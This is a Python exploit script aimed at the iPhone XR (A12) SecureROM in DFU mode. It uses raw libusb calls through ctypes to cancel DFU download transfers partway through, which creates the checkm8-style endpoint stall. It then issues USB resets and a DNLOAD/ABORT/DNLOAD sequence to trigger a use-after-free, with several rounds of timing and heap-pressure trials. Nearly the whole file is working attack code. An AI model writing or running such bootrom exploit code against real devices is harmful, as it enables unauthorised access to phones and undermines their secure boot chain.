#!/usr/bin/env python3
"""
A12 SecureROM — Raw libusb Async Stall Technique (checkm8 core mechanism)
==========================================================================
THIS IS THE KEY MISSING PIECE.

The original checkm8 exploit creates an EP0 stall by:
1. Sending a SETUP packet for DNLOAD with wLength=0x800
2. NOT completing the DATA phase (or sending partial data)
3. EP0 stalls because the host didn't provide all expected data
4. During the stall, io_buffer is allocated but data transfer incomplete
5. USB reset → DFU restarts → io_buffer freed but pointer dangling
6. Background allocations (ZLPs on A11) fill the freed slot

pyusb's ctrl_transfer() is ATOMIC — it sends SETUP+DATA+STATUS as one unit.
We CANNOT create a stall with pyusb.

This script uses ctypes to call raw libusb functions:
- libusb_alloc_transfer()
- libusb_fill_control_setup()
- libusb_submit_transfer()
- libusb_cancel_transfer()

This gives us mid-transfer cancellation capability.

Target: iPhone XR (A12/T8020) in DFU mode
"""
import ctypes, ctypes.util, sys, time, struct, json, traceback
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC
DFU_PID   = 0x1227
BUF_SZ    = 0x800

# ================================================================
# libusb constants and structures
# ================================================================
LIBUSB_TRANSFER_TYPE_CONTROL = 0
LIBUSB_TRANSFER_COMPLETED = 0
LIBUSB_TRANSFER_ERROR = 1
LIBUSB_TRANSFER_TIMED_OUT = 2
LIBUSB_TRANSFER_CANCELLED = 3
LIBUSB_TRANSFER_STALL = 4
LIBUSB_TRANSFER_NO_DEVICE = 5
LIBUSB_TRANSFER_OVERFLOW = 6

LIBUSB_ENDPOINT_OUT = 0x00
LIBUSB_ENDPOINT_IN = 0x80
LIBUSB_REQUEST_TYPE_CLASS = 0x20
LIBUSB_RECIPIENT_INTERFACE = 0x01

# DFU class-specific requests
DFU_DNLOAD = 1
DFU_UPLOAD = 2
DFU_GETSTATUS = 3
DFU_CLRSTATUS = 4
DFU_ABORT = 6

# libusb_control_setup (8 bytes, packed)
class libusb_control_setup(ctypes.LittleEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("bmRequestType", ctypes.c_uint8),
        ("bRequest", ctypes.c_uint8),
        ("wValue", ctypes.c_uint16),
        ("wIndex", ctypes.c_uint16),
        ("wLength", ctypes.c_uint16),
    ]

LIBUSB_CONTROL_SETUP_SIZE = ctypes.sizeof(libusb_control_setup)

# Callback type
if sys.platform == "win32":
    libusb_transfer_cb_fn = ctypes.WINFUNCTYPE(None, ctypes.c_void_p)
else:
    libusb_transfer_cb_fn = ctypes.CFUNCTYPE(None, ctypes.c_void_p)

class libusb_transfer(ctypes.Structure):
    _fields_ = [
        ("dev_handle", ctypes.c_void_p),
        ("flags", ctypes.c_uint8),
        ("endpoint", ctypes.c_uint8),
        ("type", ctypes.c_uint8),
        ("timeout", ctypes.c_uint),
        ("status", ctypes.c_int),
        ("length", ctypes.c_int),
        ("actual_length", ctypes.c_int),
        ("callback", libusb_transfer_cb_fn),
        ("user_data", ctypes.c_void_p),
        ("buffer", ctypes.POINTER(ctypes.c_uint8)),
        ("num_iso_packets", ctypes.c_int),
        # iso_packet_desc follows but we don't need it
    ]


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)


def get_backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)


def connect():
    d = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=get_backend())
    if d:
        try: d.set_configuration()
        except: pass
    return d


def alive():
    try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=get_backend()) is not None
    except: return False


def get_status_pyusb(d):
    try:
        r = d.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
        return {"bStatus": r[0], "bState": r[4]} if len(r) >= 6 else None
    except: return None


def clear_status_pyusb(d):
    try: d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
    except: pass


def abort_pyusb(d):
    try: d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
    except: pass


def reset_idle(d):
    for _ in range(20):
        st = get_status_pyusb(d)
        if not st: return False
        if st["bState"] == 2: return True
        if st["bState"] == 10: clear_status_pyusb(d)
        else: abort_pyusb(d)
        time.sleep(0.05)
    return False


def wait_dfu(timeout_s=90):
    log(f"  Waiting for DFU (max {timeout_s}s)...")
    for i in range(timeout_s):
        d = connect()
        if d:
            st = get_status_pyusb(d)
            if st:
                if st["bState"] == 10: clear_status_pyusb(d)
                log(f"  Found after {i+1}s")
                return d
        time.sleep(1)
        if i % 10 == 9: log(f"  Still waiting... ({i+1}s)")
    return None


# ================================================================
# Load raw libusb library
# ================================================================
def load_libusb():
    """Load and bind the raw libusb-1.0 DLL via the pyusb backend's already-loaded DLL."""
    # Get the already-loaded libusb from pyusb backend — avoids path issues
    be = get_backend()
    if be and hasattr(be, 'lib'):
        lib = be.lib
        log(f"  Using pyusb backend's libusb: {lib}")
    else:
        # Fallback: load manually
        lib_path = libusb_package.find_library(candidate='libusb-1.0')
        if lib_path is None:
            lib_path = ctypes.util.find_library("usb-1.0") or ctypes.util.find_library("libusb-1.0")
        if lib_path is None:
            raise RuntimeError("Cannot find libusb-1.0 library")
        log(f"  Loading libusb from: {lib_path}")
        lib = ctypes.CDLL(lib_path)
    
    # Bind functions
    lib.libusb_alloc_transfer.argtypes = [ctypes.c_int]
    lib.libusb_alloc_transfer.restype = ctypes.POINTER(libusb_transfer)
    
    lib.libusb_free_transfer.argtypes = [ctypes.POINTER(libusb_transfer)]
    lib.libusb_free_transfer.restype = None
    
    lib.libusb_submit_transfer.argtypes = [ctypes.POINTER(libusb_transfer)]
    lib.libusb_submit_transfer.restype = ctypes.c_int
    
    lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(libusb_transfer)]
    lib.libusb_cancel_transfer.restype = ctypes.c_int
    
    lib.libusb_handle_events_timeout_completed.argtypes = [
        ctypes.c_void_p,  # ctx
        ctypes.c_void_p,  # timeval
        ctypes.POINTER(ctypes.c_int)  # completed
    ]
    lib.libusb_handle_events_timeout_completed.restype = ctypes.c_int
    
    lib.libusb_handle_events_timeout.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    lib.libusb_handle_events_timeout.restype = ctypes.c_int
    
    return lib


def get_device_handle(dev):
    """Extract the raw libusb_device_handle (c_void_p) from a pyusb device."""
    # Ensure device is opened (set_configuration triggers open)
    try: dev.set_configuration()
    except: pass
    
    # pyusb stores handle in dev._ctx.handle._DeviceHandle.handle (c_void_p)
    try:
        dh = dev._ctx.handle
        if dh is not None and hasattr(dh, 'handle'):
            raw = dh.handle  # This is a ctypes.c_void_p
            if raw is not None and raw.value is not None:
                return raw
    except AttributeError:
        pass
    
    return None


def get_libusb_context(dev=None):
    """Get the libusb context pointer (c_void_p)."""
    try:
        be = get_backend()
        ctx = be.ctx  # Already a c_void_p
        return ctx
    except:
        return None


# ================================================================
# Stall attack implementation
# ================================================================
class StallAttack:
    def __init__(self, lib):
        self.lib = lib
        self.callback_called = False
        self.transfer_status = -1
        self.actual_length = 0
        
    def _callback(self, transfer_ptr):
        """Called when transfer completes/cancels/fails."""
        transfer = ctypes.cast(transfer_ptr, ctypes.POINTER(libusb_transfer)).contents
        self.callback_called = True
        self.transfer_status = transfer.status
        self.actual_length = transfer.actual_length
        
    def submit_and_cancel(self, dev, data, cancel_delay_ms=0.1):
        """
        Submit a DNLOAD control transfer and cancel it mid-way.
        
        The idea:
        1. Submit async DNLOAD transfer
        2. Wait cancel_delay_ms 
        3. Cancel the transfer
        4. The device may have received SETUP but not all DATA
        5. This creates a stall on EP0
        """
        results = {}
        
        # Get raw handle (c_void_p)
        handle = get_device_handle(dev)
        if handle is None:
            return {"error": "Cannot get device handle"}
        
        handle_val = handle.value
        log(f"    Raw handle ptr: 0x{handle_val:x}")
        
        # Prepare control setup + data buffer
        total_len = LIBUSB_CONTROL_SETUP_SIZE + len(data)
        buf = (ctypes.c_uint8 * total_len)()
        
        # Fill control setup
        setup = ctypes.cast(buf, ctypes.POINTER(libusb_control_setup)).contents
        setup.bmRequestType = 0x21  # Host-to-device, Class, Interface
        setup.bRequest = DFU_DNLOAD
        setup.wValue = 0
        setup.wIndex = 0
        setup.wLength = len(data)
        
        # Fill data
        for i, b in enumerate(data):
            buf[LIBUSB_CONTROL_SETUP_SIZE + i] = b
        
        # Allocate transfer
        transfer = self.lib.libusb_alloc_transfer(0)
        if not transfer:
            return {"error": "Cannot allocate transfer"}
        
        # Create callback
        cb = libusb_transfer_cb_fn(self._callback)
        self.callback_called = False
        
        # Fill transfer manually
        t = transfer.contents
        t.dev_handle = handle_val  # Raw c_void_p value
        t.endpoint = 0  # EP0
        t.type = LIBUSB_TRANSFER_TYPE_CONTROL
        t.timeout = 5000
        t.length = total_len
        t.buffer = ctypes.cast(buf, ctypes.POINTER(ctypes.c_uint8))
        t.callback = cb
        t.user_data = None
        
        # Submit transfer
        log(f"    Submitting async DNLOAD ({len(data)}B)...")
        t0 = time.perf_counter()
        
        rc = self.lib.libusb_submit_transfer(transfer)
        if rc != 0:
            self.lib.libusb_free_transfer(transfer)
            return {"error": f"Submit failed: rc={rc}"}
        
        results["submitted"] = True
        
        # Wait for cancel delay
        if cancel_delay_ms > 0:
            time.sleep(cancel_delay_ms / 1000.0)
        
        # Cancel the transfer
        log(f"    Canceling after {cancel_delay_ms}ms...")
        rc = self.lib.libusb_cancel_transfer(transfer)
        results["cancel_rc"] = rc
        
        # Handle events until callback fires
        ctx = get_libusb_context()
        
        # Create timeval struct for event loop
        class timeval(ctypes.Structure):
            _fields_ = [("tv_sec", ctypes.c_long), ("tv_usec", ctypes.c_long)]
        
        tv = timeval(tv_sec=1, tv_usec=0)
        
        for _ in range(10):
            if self.callback_called:
                break
            self.lib.libusb_handle_events_timeout(ctx, ctypes.byref(tv))
        
        t1 = time.perf_counter()
        dt = (t1 - t0) * 1000
        
        status_names = {
            0: "COMPLETED", 1: "ERROR", 2: "TIMED_OUT", 
            3: "CANCELLED", 4: "STALL", 5: "NO_DEVICE", 6: "OVERFLOW"
        }
        
        results["callback_fired"] = self.callback_called
        results["status"] = self.transfer_status
        results["status_name"] = status_names.get(self.transfer_status, f"UNKNOWN({self.transfer_status})")
        results["actual_length"] = self.actual_length
        results["time_ms"] = round(dt, 2)
        results["cancel_delay_ms"] = cancel_delay_ms
        
        log(f"    Status: {results['status_name']}, actual={self.actual_length}, time={dt:.2f}ms")
        
        # Free transfer
        self.lib.libusb_free_transfer(transfer)
        
        return results


# ================================================================
# Attack sequences using the stall
# ================================================================
def stall_attack_sequence(dev, lib, stall_delay_ms=0.1):
    """
    Full attack sequence:
    1. Normal DNLOAD - establish io_buffer 
    2. Submit async DNLOAD and CANCEL it - create stall
    3. Check device state
    4. Try to interact
    """
    results = {}
    
    # Step 1: Verify device is in IDLE
    st = get_status_pyusb(dev)
    if not st or st["bState"] != 2:
        reset_idle(dev)
        st = get_status_pyusb(dev)
    results["initial_state"] = st["bState"] if st else None
    
    # Step 2: Submit and cancel DNLOAD transfer
    attack = StallAttack(lib)
    data = b"\x00" * BUF_SZ
    
    stall_result = attack.submit_and_cancel(dev, data, cancel_delay_ms=stall_delay_ms)
    results["stall"] = stall_result
    
    # Step 3: Check device state after cancel
    if alive():
        st = get_status_pyusb(dev)
        results["state_after_cancel"] = st["bState"] if st else None
        log(f"    State after cancel: {st['bState'] if st else 'NONE'}")
        
        # Step 4: Send USB reset
        try:
            dev.reset()
        except: pass
        
        time.sleep(0.5)
        
        # Reconnect 
        dev2 = connect()
        if dev2:
            st2 = get_status_pyusb(dev2)
            results["state_after_reset"] = st2["bState"] if st2 else None
            log(f"    State after reset: {st2['bState'] if st2 else 'NONE'}")
            
            # Step 5: Try DNLOAD → ABORT → DNLOAD (UAF trigger)
            if st2:
                if st2["bState"] == 10: clear_status_pyusb(dev2)
                
                try:
                    dev2.ctrl_transfer(0x21, 1, 0, 0, b"\xAA" * BUF_SZ, timeout=2000)
                    abort_pyusb(dev2)
                    st3 = get_status_pyusb(dev2)
                    if st3 and st3["bState"] == 10: clear_status_pyusb(dev2)
                    
                    # Second DNLOAD (would normally crash)
                    dev2.ctrl_transfer(0x21, 1, 0, 0, b"\x55" * BUF_SZ, timeout=2000)
                    
                    if alive():
                        log(f"    *** SURVIVED UAF AFTER STALL! ***")
                        results["uaf_survived"] = True
                    else:
                        results["uaf_survived"] = False
                except usb.core.USBError as e:
                    results["uaf_error"] = str(e)
                    results["uaf_survived"] = False
        else:
            results["reconnect_failed"] = True
    else:
        results["crashed_after_cancel"] = True
        log(f"    Device crashed after cancel!")
    
    return results


def main():
    log("=" * 60)
    log("A12 SecureROM — Raw libusb Async Stall Technique")
    log(f"Target: iPhone XR (T8020) in DFU mode")
    log("=" * 60)
    
    d = connect()
    if not d:
        log("No DFU device. Put iPhone in DFU mode.")
        d = wait_dfu(120)
        if not d:
            log("FATAL: no device")
            return
    
    st = get_status_pyusb(d)
    log(f"Connected. State={st['bState'] if st else 'UNKNOWN'}")
    if st and st["bState"] == 10:
        clear_status_pyusb(d)
    
    all_results = {}
    
    # Step 1: Load raw libusb
    try:
        lib = load_libusb()
        log("Loaded raw libusb successfully")
    except Exception as e:
        log(f"FATAL: Cannot load libusb: {e}")
        traceback.print_exc()
        log("\nFalling back to pyusb-only tests...")
        lib = None
    
    if lib:
        # Test A: Stall with various cancel delays
        log("\n" + "="*60)
        log("TEST A: Async cancel with different delays")
        log("="*60)
        
        test_a_results = []
        for delay in [0, 0.05, 0.1, 0.5, 1.0, 5.0, 10.0]:
            d = connect()
            if not d:
                d = wait_dfu(60)
                if not d: break
            reset_idle(d)
            
            log(f"\n  Delay {delay}ms:")
            try:
                r = stall_attack_sequence(d, lib, stall_delay_ms=delay)
                test_a_results.append(r)
            except Exception as e:
                log(f"  Exception: {e}")
                traceback.print_exc()
                test_a_results.append({"delay": delay, "error": str(e)})
                d = wait_dfu(60)
        
        all_results["test_a_stall_delays"] = test_a_results
        
        # Test B: Multiple stalls before triggering the UAF
        log("\n" + "="*60)
        log("TEST B: Multiple stalls to accumulate heap pressure")
        log("="*60)
        
        d = connect()
        if not d: d = wait_dfu(60)
        if d:
            reset_idle(d)
            
            test_b_results = []
            for num_stalls in [1, 3, 5, 10]:
                d = connect()
                if not d:
                    d = wait_dfu(60)
                    if not d: break
                reset_idle(d)
                
                log(f"\n  {num_stalls} stalls before UAF:")
                stalled = 0
                for i in range(num_stalls):
                    try:
                        attack = StallAttack(lib)
                        r = attack.submit_and_cancel(d, b"\x00" * BUF_SZ, cancel_delay_ms=0.1)
                        
                        if not alive():
                            log(f"    Crashed at stall {i+1}")
                            d = wait_dfu(60)
                            break
                        
                        # Try to reset to IDLE between stalls
                        st = get_status_pyusb(d)
                        if st and st["bState"] == 10:
                            clear_status_pyusb(d)
                        elif st and st["bState"] != 2:
                            abort_pyusb(d)
                            st = get_status_pyusb(d)
                            if st and st["bState"] == 10:
                                clear_status_pyusb(d)
                        
                        stalled += 1
                    except Exception as e:
                        log(f"    Exception at stall {i+1}: {e}")
                        break
                
                if alive() and stalled == num_stalls:
                    # Now trigger UAF
                    try:
                        d.ctrl_transfer(0x21, 1, 0, 0, b"\xAA" * BUF_SZ, timeout=2000)
                        abort_pyusb(d)
                        st = get_status_pyusb(d)
                        if st and st["bState"] == 10: clear_status_pyusb(d)
                        
                        d.ctrl_transfer(0x21, 1, 0, 0, b"\x55" * BUF_SZ, timeout=2000)
                        
                        if alive():
                            log(f"    *** SURVIVED UAF after {num_stalls} stalls! ***")
                            test_b_results.append({"stalls": num_stalls, "uaf_survived": True})
                        else:
                            log(f"    UAF still crashes after {num_stalls} stalls")
                            test_b_results.append({"stalls": num_stalls, "uaf_survived": False})
                            d = wait_dfu(60)
                    except usb.core.USBError as e:
                        test_b_results.append({"stalls": num_stalls, "error": str(e)})
                        if not alive(): d = wait_dfu(60)
                else:
                    test_b_results.append({"stalls": num_stalls, "completed_stalls": stalled, "crashed_during_stalls": True})
            
            all_results["test_b_multi_stall"] = test_b_results
        
        # Test C: Stall + USB reset + rapid reconnect (checkm8 timing)
        log("\n" + "="*60)
        log("TEST C: Stall + reset + rapid reconnect (checkm8 timing)")
        log("="*60)
        
        d = connect()
        if not d: d = wait_dfu(60)
        if d:
            reset_idle(d)
            test_c_results = []
            
            for delay in [0, 0.5, 1, 5]:
                d = connect()
                if not d:
                    d = wait_dfu(60)
                    if not d: break
                reset_idle(d)
                
                log(f"\n  Stall(delay={delay}ms) + reset + reconnect:")
                
                try:
                    # Submit stall
                    attack = StallAttack(lib)
                    r = attack.submit_and_cancel(d, b"\x00" * BUF_SZ, cancel_delay_ms=delay)
                    
                    stall_status = r.get("status_name", "?")
                    log(f"    Stall: {stall_status}")
                    
                    if not alive():
                        test_c_results.append({"delay": delay, "crashed_at_stall": True})
                        d = wait_dfu(60)
                        continue
                    
                    # USB reset
                    try:
                        d.reset()
                    except: pass
                    time.sleep(0.1)
                    
                    # Rapid reconnect and try operations
                    d2 = connect()
                    if d2:
                        st = get_status_pyusb(d2)
                        if st and st["bState"] == 10: clear_status_pyusb(d2)
                        
                        # Try GET_STATUS repeatedly (small allocations)
                        for _ in range(50):
                            get_status_pyusb(d2)
                        
                        # Now try DNLOAD → ABORT → DNLOAD 
                        try:
                            d2.ctrl_transfer(0x21, 1, 0, 0, b"\xAA" * BUF_SZ, timeout=2000)
                            abort_pyusb(d2)
                            st = get_status_pyusb(d2)
                            if st and st["bState"] == 10: clear_status_pyusb(d2)
                            
                            d2.ctrl_transfer(0x21, 1, 0, 0, b"\x55" * BUF_SZ, timeout=2000)
                            
                            survived = alive()
                            if survived:
                                log(f"    *** SURVIVED UAF! ***")
                            else:
                                log(f"    UAF crashed")
                            test_c_results.append({
                                "delay": delay, "stall_status": stall_status,
                                "uaf_survived": survived
                            })
                            if not survived: d = wait_dfu(60)
                        except usb.core.USBError as e:
                            test_c_results.append({"delay": delay, "uaf_error": str(e)})
                            if not alive(): d = wait_dfu(60)
                    else:
                        test_c_results.append({"delay": delay, "reconnect_failed": True})
                        d = wait_dfu(60)
                        
                except Exception as e:
                    test_c_results.append({"delay": delay, "error": str(e)})
                    traceback.print_exc()
                    if not alive(): d = wait_dfu(60)
            
            all_results["test_c_stall_reset"] = test_c_results
    
    else:
        log("\n  No raw libusb available — trying pyusb workarounds")
        
        # Workaround: Very short timeout control transfers
        log("\n" + "="*60)
        log("FALLBACK: pyusb timeout-based cancel attempts")
        log("="*60)
        
        fb_results = []
        for to_ms in [1, 2, 5, 10, 50]:
            d = connect()
            if not d:
                d = wait_dfu(60)
                if not d: break
            reset_idle(d)
            
            log(f"\n  DNLOAD with timeout={to_ms}ms:")
            t0 = time.perf_counter()
            try:
                d.ctrl_transfer(0x21, 1, 0, 0, b"\x00" * BUF_SZ, timeout=to_ms)
                t1 = time.perf_counter()
                dt = (t1-t0)*1000
                st = get_status_pyusb(d)
                log(f"    Completed in {dt:.2f}ms, state={st['bState'] if st else 'NONE'}")
                fb_results.append({"timeout": to_ms, "completed": True, "time_ms": round(dt, 2), "state": st["bState"] if st else None})
            except usb.core.USBTimeoutError:
                t1 = time.perf_counter()
                dt = (t1-t0)*1000
                is_alive = alive()
                st = get_status_pyusb(d) if is_alive else None
                log(f"    TIMEOUT after {dt:.2f}ms! alive={is_alive}, state={st['bState'] if st else 'NONE'}")
                fb_results.append({
                    "timeout": to_ms, "timed_out": True, "time_ms": round(dt, 2),
                    "alive": is_alive, "state": st["bState"] if st else None
                })
                if not is_alive: d = wait_dfu(60)
            except usb.core.USBError as e:
                is_alive = alive()
                fb_results.append({"timeout": to_ms, "error": str(e), "alive": is_alive})
                if not is_alive: d = wait_dfu(60)
        
        all_results["fallback_timeout"] = fb_results
    
    # Save results
    outf = Path(__file__).parent / "results" / "stall_attack_results.json"
    outf.parent.mkdir(exist_ok=True)
    with open(outf, "w") as f:
        json.dump({
            "timestamp": datetime.now().isoformat(),
            "device": "iPhone XR (A12/T8020)",
            "raw_libusb_available": lib is not None,
            "results": all_results
        }, f, indent=2)
    
    log(f"\n{'='*60}")
    log(f"Results saved: {outf}")
    log(f"{'='*60}")
    
    # Summary
    log("\n=== SUMMARY ===")
    for test_name, data in all_results.items():
        log(f"\n  {test_name}:")
        if isinstance(data, list):
            for r in data:
                if r.get("uaf_survived"):
                    log(f"    ⚡⚡⚡ UAF SURVIVED! {r}")
                elif "error" in r:
                    log(f"    ✗ Error: {r['error']}")
                else:
                    survived = r.get("uaf_survived", "N/A")
                    log(f"    → UAF survived={survived}")
        elif isinstance(data, dict):
            if "error" in data:
                log(f"    Error: {data['error']}")

if __name__ == "__main__":
    main()
